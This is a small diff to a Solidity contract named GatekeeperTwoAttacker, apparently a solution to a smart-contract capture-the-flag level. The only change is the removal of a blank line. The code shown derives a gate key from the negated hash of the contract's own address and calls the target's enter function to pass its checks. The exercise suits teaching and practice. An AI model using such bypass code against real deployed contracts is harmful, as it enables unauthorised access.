@@ -10,6 +10,5 @@ contract GatekeeperTwoAttacker {
         bytes8 key = ~bytes8(keccak256(abi.encodePacked(address(this))));
         IGatekeeperTwo gatekeeperTwo = IGatekeeperTwo(_gatekeeperTwo);
         gatekeeperTwo.enter(key);
-
     }
 }
